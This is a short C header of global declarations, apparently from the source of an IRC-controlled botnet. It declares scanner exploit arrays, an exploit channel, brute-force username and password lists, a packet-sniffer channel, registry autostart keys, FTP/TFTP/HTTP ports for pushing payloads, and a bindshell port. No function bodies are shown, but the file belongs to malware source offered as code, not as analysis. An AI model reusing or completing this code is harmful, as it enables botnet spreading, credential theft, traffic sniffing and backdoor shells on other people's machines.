extern SOCKET csock[64];       // thread sockets
//extern char threadd[64][128];  // thread descriptions
//extern HANDLE threads[64];     // thread handles

extern THREAD threads[MAXTHREADS]; //new thread handles

extern char pbuff[65500];      // packet buffer
#ifndef NO_PING
extern BOOL noicmp;            // if true, icmp.dll is available
#endif
extern BOOL noigcs;
extern BOOL noigcse;
extern HANDLE ih;              // internet handle

extern int port;
extern BOOL regrun;

// cftp shit
extern char lsaport[];
extern char lsaip[];
extern char lsuser[];
extern char lspass[];

extern char valuename[];
extern char tempdir[256];
extern char channel[];
extern char filename[];
extern int maxrand;
extern int nicktype;
extern BOOL nickprefix;
extern char *authost[];
extern char nickconst[];
extern char psniffchan[];
extern char *usernames[];
extern char *passwords[];

#ifdef PLAIN_CRYPT
extern char key[];
#endif

extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];

#ifdef _DEBUG
extern char logbuf[1024];
extern HANDLE mhStdOut;
#endif

#ifndef NO_ADVSCAN
extern EXPLOIT exploit[];
extern EXPLOIT combo[];
#endif

extern char exploitchan[];
extern int	FTP_PORT;
extern int	CSEND_PORT;
extern int      tftpport;
extern int httpport;

//wks
extern unsigned short bport;
extern char bindshell[];

#ifndef NO_VNC 
extern char http[]; 
#endif

//combo
extern SCANALL scanall[];